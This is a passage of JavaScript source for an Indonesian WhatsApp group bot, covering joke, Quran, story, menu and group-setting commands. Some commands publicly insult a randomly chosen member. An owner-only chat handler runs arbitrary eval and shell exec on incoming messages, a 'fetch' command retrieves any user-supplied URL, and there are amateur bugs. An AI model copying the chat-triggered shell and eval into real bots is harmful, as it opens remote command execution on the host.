				groupMembers
			const siapss = nus[
				Math.floor(
					Math
					.random() *
					nus
					.length)
			]
			const sipss =
				pushname[Math
					.floor(Math
						.random() *
						msl
						.length)
				]
			teks =
				`*Masih Gantengan Owner Gua :* @${siapss.jid.split('@')[0]}`
			membr.push(siapss
				.jid)
			mentions(teks,
				membr, true)
			break
		case 'babi':
			membr = []
			const meg =
				groupMembers
			const mge =
				groupMembers
			const ba = meg[Math
				.floor(Math
					.random() *
					meg
					.length)
			]
			const bi = pushname[
				Math.floor(
					Math
					.random() *
					mge
					.length)
			]
			teks =
				`*Yang Paling Babi Disini Adalah :* @${ba.jid.split('@')[0]}`
			membr.push(ba.jid)
			mentions(teks,
				membr, true)
			break
		case 'beban':
			membr = []
			const nge =
				groupMembers
			const tod =
				groupMembers
			const beb = nge[Math
				.floor(Math
					.random() *
					nge
					.length)
			]
			const an = pushname[
				Math.floor(
					Math
					.random() *
					tod
					.length)
			]
			teks =
				`*Yang Paling Beban Disini Adalah :* @${beb.jid.split('@')[0]}`
			membr.push(beb.jid)
			mentions(teks,
				membr, true)
			break
			//------------------< Lainnya >-------------------

		case 'ban':
			Maslent
				.updatePresence(
					from,
					Presence
					.composing)
			if (args.length < 1)
				return
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			mentioned = mek
				.message
				.extendedTextMessage
				.contextInfo
				.mentionedJid
			ban = mentioned
			reply(
				`berhasil banned : ${ban}`
			)
			break
		case 'unban':
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess
					.only
					.owner)
			bnnd = body.slice(8)
			ban.splice(
				`${bnnd}@s.whatsapp.net`,
				1)
			reply(
				`Nomor wa.me/${bnnd} telah di unban!`
			)
			break
		case 'getpp':
			if (mek.message
				.extendedTextMessage ===
				null || mek
				.message
				.extendedTextMessage ===
				undefined) {
				linkpp =
					await Maslent
					.getProfilePicture(
						from) ||
					"https://telegra.ph/file/40151a65238ba2643152d.jpg"
				buffer =
					await getBuffer(
						linkpp)
				Maslent
					.sendMessage(
						from,
						buffer,
						image, {
							caption: "Nih",
							quoted: mek
						})
			} else if (mek
				.message
				.extendedTextMessage
				.contextInfo
				.mentionedJid ===
				null || mek
				.message
				.extendedTextMessage
				.contextInfo
				.mentionedJid ===
				undefined) {
				mberr = mek
					.message
					.extendedTextMessage
					.contextInfo
					.participant
				linkpp =
					await Maslent
					.getProfilePicture(
						mberr
					) ||
					"https://telegra.ph/file/40151a65238ba2643152d.jpg"
				buffer =
					await getBuffer(
						linkpp)
				Maslent
					.sendMessage(
						from,
						buffer,
						image, {
							quoted: mek,
							caption: `Profile Picture of @${mberr.split("@")[0]}`,
							contextInfo: {
								"mentionedJid": [
									mberr
								]
							}
						})
			} else if (mek
				.message
				.extendedTextMessage
				.contextInfo
				.mentionedJid
				.length > 0) {
				mberr = mek
					.message
					.extendedTextMessage
					.contextInfo
					.mentionedJid[
						0]
				linkpp =
					await Maslent
					.getProfilePicture(
						mberr
					) ||
					"https://telegra.ph/file/40151a65238ba2643152d.jpg"
				buffer =
					await getBuffer(
						linkpp)
				Maslent
					.sendMessage(
						from,
						buffer,
						image, {
							quoted: mek,
							caption: `Profile Picture of @${mberr.split("@")[0]}`,
							contextInfo: {
								"mentionedJid": [
									mberr
								]
							}
						})
			}
			break
		case 'd':
		case 'del':
		case 'delete': // MR.CYSER
			try {
				if (mek.message
					.extendedTextMessage ===
					undefined ||
					mek.message
					.extendedTextMessage ===
					null)
					return reply(
						'Reply chat bot'
					)
				Maslent
					.deleteMessage(
						from, {
							id: mek
								.message
								.extendedTextMessage
								.contextInfo
								.stanzaId,
							remoteJid: from,
							fromMe: true
						})
			} catch (e) {
				reply(
					'Reply chat bot'
				)
			}
			break
		case 'tes':
			reply('Okeh nyala')
			break
		case 'info': // Jangan Di Ubah Plise
			urlinfo =
				'https://telegra.ph/file/dc85e75f91277070254e5.jpg'
			thankslort =
				`*━━━━INFO BOT━━━━*\n*O>Nama : ${botname}*\n*O>JAM : ${moment().utcOffset('+0700').format('HH:mm')}*\n*O>DATE : ${moment.tz('Asia/Jakarta').format('DD/MM')}*\n*O>Tipe : Node Js*\n*O>Versi : 3.3*\n*━━━━━━━━━━━━━━━*`
			Maslent.sendMessage(
				from,
				await getBuffer(
					urlinfo
				),
				image, {
					quoted: mek,
					caption: thankslort
				})
			break
		case 'get':
		case 'fetch': //ambil dari nuru
			if (!/^https?:\/\//
				.test(q))
				return reply(
					'Awali *URL* dengan http:// atau https://'
				)
			res = await fetch(q)
			if (res.headers.get(
					'content-length'
				) > 100 *
				1024 * 1024 *
				1024) {
				delete res
				throw `Content-Length: ${res.headers.get('content-length')}`
			}
			if (!/text|json/
				.test(res
					.headers
					.get(
						'content-type'
					)))
				return sendMediaURL(
					from, q)
			txtx = await res
				.buffer()
			try {
				txtx = util
					.format(JSON
						.parse(
							txtx +
							''))
			} catch (e) {
				txtx = txtx + ''
			} finally {
				reply(txtx
					.slice(
						0,
						65536
					) +
					'')
			}
			break
		case 'searchmsg':
		case 'caripesan': //by ANU TEAM
			if (args.length < 1)
				return reply(
					`Pesan Yang Mau Dicari Apaan?\nContoh : ${prefix + command} halo|10`
				)
			teks = arg
			if (teks.includes(
					"|")) {
				try {
					var ve =
						teks
						.split(
							"|"
						)[0]
					var za =
						teks
						.split(
							"|"
						)[1]
					sampai =
						`${za}`
					if (isNaN(
							sampai
						))
						return reply(
							'Harus berupa Angka!'
						)
					batas =
						parseInt(
							sampai
						) +
						1
					if (batas >
						30)
						return reply(
							'Maks 30!'
						)
					reply(mess
						.wait
					)
					cok =
						await Maslent
						.searchMessages(
							`${ve}`,
							from,
							batas,
							1)
					if (cok
						.messages
						.length <
						2)
						return reply(
							'Tidak Ditemukan Pesan'
						)
					if (cok
						.messages
						.length <
						parseInt(
							batas
						))
						reply(
							`Hanya Ditemukan ${cok.messages.length - 1} Pesan`
						)
					for (i =
						1; i <
						cok
						.messages
						.length; i++
					) {
						if (cok
							.messages[
								i
							]
							.message
						) {
							Maslent
								.sendMessage(
									from,
									`Ditemukan!`,
									text, {
										sendEphemeral: true,
										quoted: cok
											.messages[
												i
											]
									}
								)
						}
					}
				} catch (e) {
					return reply(
						String(
							e
						)
					)
				}
			} else {
				reply(
					`Format salah tod, ini contoh format yang benar : ${prefix + command} halo|10`
				)
			}
			break
		case 'lolkey':
		case 'cekapikey':
			if (args.length < 1)
				return reply(
					`Ketik ${prefix}lolkey [Apikeynya]`
				)
			anu =
				await fetchJson(
					`http://api.lolhuman.xyz/api/checkapikey?apikey=${q}`
				)
			teks =
				`*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = http://api.lolhuman.xyz`
			Maslent.sendMessage(
				from, teks,
				text, {
					quoted: troli
				})
			break
		case 'bugreport':
			if (args.length < 1)
				return reply(
					`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`
				)
			teks = args.join(
				' ')
			reply(
				'Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!'
			)
			Maslent.sendMessage(
				'6282287486762@s.whatsapp.net',
				`*Bug Report:* ${teks}`,
				text)
			break
		case 'readall':
			totalchat.map(
				async ({
					jid
				}) => {
					await Maslent
						.chatRead(
							jid
						)
				})
			reply(
				`\`\`\`Berhasil membaca ${unread.length} Chat !\`\`\``
			)
			console.log(
				totalchat
				.length)
			break
			break

			//-------------------< islam menu >--------------------

		case 'kisahnabi':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} Muhammad`
			)
			query = args.join(
				" ")
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${setting.lolkey}`
				)
			get_result =
				get_result
				.result
			ini_txt =
				`Name : ${get_result.name}\n`
			ini_txt +=
				`Lahir : ${get_result.thn_kelahiran}\n`
			ini_txt +=
				`Umur : ${get_result.age}\n`
			ini_txt +=
				`Tempat : ${get_result.place}\n`
			ini_txt +=
				`Story : \n${get_result.story}`
			reply(ini_txt)
			break
		case 'jadwalsholat':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} Yogyakarta`
			)
			daerah = args.join(
				" ")
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${setting.lolkey}`
				)
			get_result =
				get_result
				.result
			ini_txt =
				`Wilayah : ${get_result.wilayah}\n`
			ini_txt +=
				`Tanggal : ${get_result.tanggal}\n`
			ini_txt +=
				`Sahur : ${get_result.sahur}\n`
			ini_txt +=
				`Imsak : ${get_result.imsak}\n`
			ini_txt +=
				`Subuh : ${get_result.subuh}\n`
			ini_txt +=
				`Terbit : ${get_result.terbit}\n`
			ini_txt +=
				`Dhuha : ${get_result.dhuha}\n`
			ini_txt +=
				`Dzuhur : ${get_result.dzuhur}\n`
			ini_txt +=
				`Ashar : ${get_result.ashar}\n`
			ini_txt +=
				`Maghrib : ${get_result.imsak}\n`
			ini_txt +=
				`Isya : ${get_result.isya}`
			reply(ini_txt)
			break
		case 'listsurah':
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/quran?apikey=${setting.lolkey}`
				)
			get_result =
				get_result
				.result
			ini_txt =
				'List Surah:\n'
			for (var x in
					get_result) {
				ini_txt +=
					`${x}. ${get_result[x]}\n`
			}
			reply(ini_txt)
			break
		case 'alquran':
			if (args.length < 1)
				return reply(
					`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`
				)
			urls =
				`http://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${setting.lolkey}`
			quran =
				await fetchJson(
					urls)
			result = quran
				.result
			ayat = result.ayat
			ini_txt =
				`QS. ${result.surah} : 1-${ayat.length}\n\n`
			for (var x of
					ayat) {
				arab = x.arab
				nomor = x.ayat
				latin = x.latin
				indo = x
					.indonesia
				ini_txt +=
					`${arab}\n${nomor}. ${latin}\n${indo}\n\n`
			}
			ini_txt = ini_txt
				.replace(/<u>/g,
					"").replace(
					/<\/u>/g, ""
				)
			ini_txt = ini_txt
				.replace(
					/<strong>/g,
					"").replace(
					/<\/strong>/g,
					"")
			ini_txt = ini_txt
				.replace(/<u>/g,
					"").replace(
					/<\/u>/g, ""
				)
			reply(ini_txt)
			break
		case 'asmaulhusna':
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/asmaulhusna?apikey=${setting.lolkey}`
				)
			get_result =
				get_result
				.result
			ini_txt =
				`No : ${get_result.index}\n`
			ini_txt +=
				`Latin: ${get_result.latin}\n`
			ini_txt +=
				`Arab : ${get_result.ar}\n`
			ini_txt +=
				`Indonesia : ${get_result.id}\n`
			ini_txt +=
				`English : ${get_result.en}`
			reply(ini_txt)
			break
		case 'alquranaudio':
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} 18 or ${prefix + command} 18/10`
			)
			surah = args[0]
			ini_buffer =
				await getBuffer(
					`http://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${setting.lolkey}`
				)
			Maslent.sendMessage(
				from,
				ini_buffer,
				audio, {
					quoted: mek,
					mimetype: Mimetype
						.mp4Audio
				})
			break
			//------------------< serti menu >-------------------   
		case 'sertitolol':
			if (args.length < 1)
				return reply(
					`Textnya Mana Cuy?\n*Contoh ${prefix}tololserti chi BOT`
				)
			ct = body.slice(12)
			zhain =
				await getBuffer(
					`https://api.lolhuman.xyz/api/toloserti?apikey=${setting.lolkey}&name=${ct}`
				)
			Maslent.sendMessage(
				from, zhain,
				image, {
					quoted: mek,
					caption: 'Nih Dah Jadi'
				})
			break
			//------------------< cerita menu >-------------------
		case 'cerpen':

			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/cerpen?apikey=${setting.lolkey}`
				)
			get_result =
				get_result
				.result
			ini_txt =
				`Title : ${get_result.title}\n`
			ini_txt +=
				`Creator : ${get_result.creator}\n`
			ini_txt +=
				`Story :\n${get_result.cerpen}`
			reply(ini_txt)
			break
		case 'ceritahoror':
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/ceritahoror?apikey=${setting.lolkey}`
				)
			get_result =
				get_result
				.result
			ini_txt =
				`Title : ${get_result.title}\n`
			ini_txt +=
				`Desc : ${get_result.desc}\n`
			ini_txt +=
				`Story :\n${get_result.story}\n`
			thumbnail =
				await getBuffer(
					get_result
					.thumbnail)
			Maslent.sendMessage(
				from,
				thumbnail,
				image, {
					quoted: mek,
					caption: ini_txt
				})
			break
			//------------------(KATA KATA MENU)---------+--------

		case 'quotesdilan':
			quotedilan =
				await fetchJson(
					`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${setting.lolkey}`
				)
			yah = quotedilan
				.result
			button = [
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '️➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			},
			{
				buttonId: `y`,
				buttonText: {
					displayText: '️❌ 𝑺𝒕𝒐𝒑'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${yah}`,
				footerText: `Created By ©Chi bot wa`,
				buttons: button,
				headerType: 1
			}
			await Maslent
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek
					})
			limitAdd(sender,
				limit)
			break;

		case 'faktaunik':
		case 'katabijak':
		case 'pantun':
		case 'bucin':
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/random/${command}?apikey=${setting.lolkey}`
				)
			gege = get_result
				.result
			button = [
			{
				buttonId: `${prefix+command}`,
				buttonText: {
					displayText: '️➡️ 𝑵𝒆𝒙𝒕'
				},
				type: 1
			},
			{
				buttonId: `y`,
				buttonText: {
					displayText: '️❌ 𝑺𝒕𝒐𝒑'
				},
				type: 1
			}, ]
			buttons = {
				contentText: `${gege}`,
				footerText: `Created By 🤖chiBOT WA`,
				buttons: button,
				headerType: 1
			}
			await Maslent
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek
					})
			limitAdd(sender,
				limit)
			break;
			break
			//------------------< Maker Menu >--------------------   


			//------------------< enable/disable>-------------------
		case 'leveling':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (ar[0] ===
				'enable') {
				if (
					isLevelingOn
				)
					return reply(
						'Fitur leveling telah diaktifkan sebelumnya.'
					)
				_leveling.push(
					from)
				fs.writeFileSync(
					'./database/group/leveling.json',
					JSON
					.stringify(
						_leveling
					))
				reply(
					'Fitur leveling berhasil diaktifkan.'
				)
			} else if (ar[0] ===
				'disable') {
				var anup =
					_leveling
					.indexOf(
						from)
				_leveling
					.splice(
						anup, 1)
				fs.writeFileSync(
					'./database/group/leveling.json',
					JSON
					.stringify(
						_leveling
					))
				reply(
					'Fitur leveling berhasil dimatikan.'
				)
			} else {
				reply(
					'Pilih enable atau disable!'
				)
			}
			break
		case 'antilink':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (!
				isBotGroupAdmins
			) return reply(
				`Bot Harus jadi Admin`
			)
			if (!q) return reply(
				`Pilih enable atau disable`
			)
			if (args[0]
				.toLowerCase() ===
				'enable') {
				if (isAntiLink)
					return reply(
						`Udah aktif`
					)
				antilink.push(
					from)
				fs.writeFileSync(
					'./database/group/antilink.json',
					JSON
					.stringify(
						antilink
					))
				reply(
					'*「 ANTILINK DI AKTIFKAN 」*\n\nYang Ngirim Link Group Bakal Ke Kick!'
				)
			} else if (args[0]
				.toLowerCase() ===
				'disable') {
				let anu =
					antilink
					.indexOf(
						from)
				antilink.splice(
					anu, 1)
				fs.writeFileSync(
					'./database/group/antilink.json',
					JSON
					.stringify(
						antilink
					))
				reply(
					'*「 ANTILINK DI NONAKTIFKAN 」*'
				)
			} else {
				reply(
					`Pilih enable atau disable`
				)
			}
			break
		case 'welcome':
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'!welcome enable/disable'
				)
			if ((args[0]) ===
				'enable') {
				if (isWelkom)
					return reply(
						'Udah aktif'
					)
				welkom.push(
					from)
				fs.writeFileSync(
					'./database/group/welcome.json',
					JSON
					.stringify(
						welkom
					))
				reply(
					'Sukses mengaktifkan fitur welcome di group ini ✔️'
				)
			} else if ((args[
					0]) ===
				'disable') {
				welkom.splice(
					from, 1)
				fs.writeFileSync(
					'./database/group/welcome.json',
					JSON
					.stringify(
						welkom
					))
				reply(
					'Sukses menonaktifkan fitur welcome di group ini ✔️'
				)
			} else {
				reply(
					'Enable untuk mengaktifkan, disable untuk menonaktifkan'
				)
			}
			break
		case 'mute':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (args.length < 1)
				return reply(
					'!mute enable/disable'
				)
			if (args[0]
				.toLowerCase() ===
				'enable') {
				if (isMuted)
					return reply(
						`udah di mute`
					)
				mute.push(from)
				fs.writeFileSync(
					'./database/group/mute.json',
					JSON
					.stringify(
						mute
					))
				reply(
					`*...:* *MUTE ON* *:...*\n\nPerhatian untuk member grup\nBot telah di mute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`
				)
			} else if (args[0]
				.toLowerCase() ===
				'disable') {
				anu = mute
					.indexOf(
						from)
				mute.splice(anu,
					1)
				fs.writeFileSync(
					'./database/group/mute.json',
					JSON
					.stringify(
						mute
					))
				reply(
					`*...:* *𝙈𝙐𝙏𝙀 𝙊𝙁𝙁* *:...*\n\nPerhatian untuk member grup\nBot telah di unmute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`
				)
			} else {
				reply(
					`Pilih enable atau disable`
				)
			}
			break
		case 'grupsetting':
		case 'groupsetting':
			if (!isGroup)
				return reply(
					mess
					.only
					.group)
			if (!isGroupAdmins)
				return reply(
					mess
					.only
					.admin)
			list = []
			com = [`group buka`,
				`leveling enable`,
				`welcome enable`,
				`antilink enable`,
				`mute enable`
			]
			comm = [`group tutup`,
				`leveling disable`,
				`welcome disable`,
				`antilink disable`,
				`mute disable`
			]
			listnya = [
				`Group open/close`,
				`Leveling enable/disable`,
				`Welcome enable/disable`,
				`Antilink enable/disable`,
				`Mute enable/disable`
			]
			suruh = [`Enable`,
				`Disable`
			]
			fiturname = [
				`Group`,
				`Leveling`,
				`Welcome`,
				`Antilink`,
				`Mute`
			]
			startnum = 0;
			let startnu = 0;
			let startn = 0;
			let start = 0
			startnumm = 1
			for (let x of com) {
				var yy = {
					title: `${listnya[startnum++]}`,
					rows: [
					{
						title: `${suruh[0]}`,
						description: `\nMengaktifkan ${fiturname[startnu++]}`,
						rowId: `${prefix}${x}`
					},
					{
						title: `${suruh[1]}`,
						description: `\nMenonaktifkan ${fiturname[startn++]}`,
						rowId: `${prefix}${comm[start++]}`
					}]
				}
				list.push(yy)
			}
			listmsg(from,
				`Group Setting`,
				`Atur Settingan Grup anda disini......`,
				list)

			break
		case 'group':
			if (!isGroup)
				return reply(ind
					.groupo()
				)
			if (!isGroupAdmins)
				return reply(ind
					.admin()
				)
			if (!
				isBotGroupAdmins
			) return reply(
				ind
				.badmin()
			)
			if (args[0] ===
				'buka') {
				reply(
					`*BERHASIL MEMBUKA GROUP*`
				)
				Maslent
					.groupSettingChange(
						from,
						GroupSettingChange
						.messageSend,
						false)
			} else if (args[
					0] ===
				'tutup'
			) {
				reply(
					`*BERHASIL MENUTUP GROUP*`
				)
				Maslent
					.groupSettingChange(
						from,
						GroupSettingChange
						.messageSend,
						true)
			}
			break
			//------------------< Menunya Bang:v >-------------------

		case 'ownermenu':
			Maslent.sendMessage(
				from,
				ownerMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'downloadmenu':
			Maslent.sendMessage(
				from,
				downloadMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'gamemenu':
			Maslent.sendMessage(
				from,
				gameMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'rules':
			Maslent.sendMessage(
				from,
				rulesBot(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'owner':
			Maslent.sendMessage(
				from, owner(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'wibumenu':
			Maslent.sendMessage(
				from,
				wibuMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'infomenu':
			Maslent.sendMessage(
				from,
				infoMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'stickermenu':
			Maslent.sendMessage(
				from,
				stickerMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'islammenu':
			Maslent.sendMessage(
				from,
				islamMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'sertimenu':
			Maslent.sendMessage(
				from,
				sertiMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'ceritamenu':
			Maslent.sendMessage(
				from,
				ceritaMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'makermenu':
			Maslent.sendMessage(
				from,
				makerMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'toolsmenu':
			Maslent.sendMessage(
				from,
				toolsMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'dewasamenu':
			Maslent.sendMessage(
				from,
				dewasaMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'othermenu':
			Maslent.sendMessage(
				from,
				otherMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'groupmenu':
		case 'grupmenu':
			Maslent.sendMessage(
				from,
				groupMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break
		case 'funmenu':
			Maslent.sendMessage(
				from,
				funMenu(
					prefix),
				MessageType
				.text, {
					quoted: troli
				})
			break

		default:
			if (fs.existsSync(
					`./XNXXs2/${from}.json`
				)) {
				gelutSkuy =
					setGelud(
						`${from}`
					)
				if (sender ==
					`${gelutSkuy.Y}@s.whatsapp.net` &&
					budy
					.toLowerCase() ==
					'y') {
					if (gelutSkuy
						.status)
						return reply(
							`Game telah dimulai sebelumnya!`
						)
					gelutSkuy
						.status =
						true
					rand0m = [
						gelutSkuy
						.Z,
						gelutSkuy
						.Y
					]
					winR =
						rand0m[
							Math
							.floor(
								Math
								.random() *
								rand0m
								.length
							)
						]
					fs.writeFileSync(
						`./XNXXs2/${from}.json`,
						JSON
						.stringify(
							gelutSkuy,
							null,
							2
						)
					)
					starGame = `👑 Gelud Game 🤙🏻 

Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
• Pemenangnya adalah [ @${winR} ] `
					Maslent
						.sendMessage(
							from,
							starGame,
							text, {
								quoted: troli,
								contextInfo: {
									mentionedJid: [
										winR +
										"@s.whatsapp.net",
										gelutSkuy
										.Z +
										"@s.whatsapp.net",
										gelutSkuy
										.Y +
										"@s.whatsapp.net",
									]
								}
							})
					fs.unlinkSync(
						"./XNXXs2/" +
						from +
						".json"
					);
				} else if (
					sender ==
					`${gelutSkuy.Y}@s.whatsapp.net` &&
					budy
					.toLowerCase() ==
					'n') {
					Maslent
						.sendMessage(
							from, `👑 Game Gelud Rejected 🤙🏻
• @${gelutSkuy.Y} Menolak🤙🏻`, text, {
								quoted: troli,
								contextInfo: {
									mentionedJid: [
										gelutSkuy
										.Y +
										"@s.whatsapp.net"
									]
								}
							})
					fs.unlinkSync(
						"./XNXXs2/" +
						from +
						".json"
					);
				}
			}

			if (budy.startsWith(
					'>')) {
				if (!mek.key
					.fromMe && !
					isOwner)
					return
				try {
					return Maslent
						.sendMessage(
							from,
							JSON
							.stringify(
								eval(
									budy
									.slice(
										2
									)
								),
								null,
								'\t'
							),
							text, {
								quoted: mek
							})
				} catch (err) {
					e = String(
						err)
					reply(e)
				}
			}
			if (budy.startsWith(
					'$')) {
				if (!mek.key
					.fromMe && !
					isOwner)
					return
				qur = budy
					.slice(2)
				exec(qur, (err,
					stdout
				) => {
					if (
						err
					)
						return reply(
							`${fake} :~ ${err}`
						)
					if (
						stdout
					) {
						reply
							(
								stdout
							)
					}
				})
			}

			if (!isOwner && !mek
				.key.fromMe)
				return
			if (budy.startsWith(
					'+')) {
				try {
					console.log(
						color(
							'[ EVAL ]',
							'pink'
						),
						color(
							time
						),
						budy,
						color(
							'dari',
							'yellow'
						),
						pushname,
						color(
							'di'
						),
						isGroup ?
						groupName :
						'Private Chat'
					)
					reply(require(
							'util'
						)
						.format(
							eval(
								`;(async () => { ${budy.slice(2)} })()`
							)
						)
					)
				} catch (e) {
					console.log(
						e)
					err =
						String(
							e)
					js = JSON
						.stringify(
							e,
							null,
							2)
					if (js ==
						'{}')
						js = {
							err
						}
					js = JSON
						.stringify(
							js,
							null,
							2)
					js = '```' +
						js +
						'```'
					reply('_' +
						err +
						'_\n\n' +
						js)
				}
			}
			if (!isGroup &&
				isCmd && !mek
				.key.fromMe) {
				teks =
					`Maaf @${senderr.split('@')[0]}, command ${prefix + command} tidak ada dalam menu`
				Maslent
					.sendMessage(
						from, {
							text: teks,
							jpegThumbnail: fs
								.readFileSync(
									'./XNXXs2/canss.jpg'
								)
						},
						'extendedTextMessage', {
							sendEphemeral: true,
							quoted: mek,
							contextInfo: {
								forwardingScore: 508,
								isForwarded: true,
								mentionedJid: [
									senderr
								]
							}
						})
			}
		}
		if (isGroup && budy !=
			undefined) {} else {
			console.log('[',
				color(
					'TEXT',
					'teal'),
				']',
				`Message : ${budy} From`,
				color(
					pushname
				))
		}

	} catch (e) {
		e = String(e)
		if (!e.includes(
				"this.iszero"
			)) {
			console.log(
				'Message : %s',
				color(e,
					'green')
			)
		}
	}
}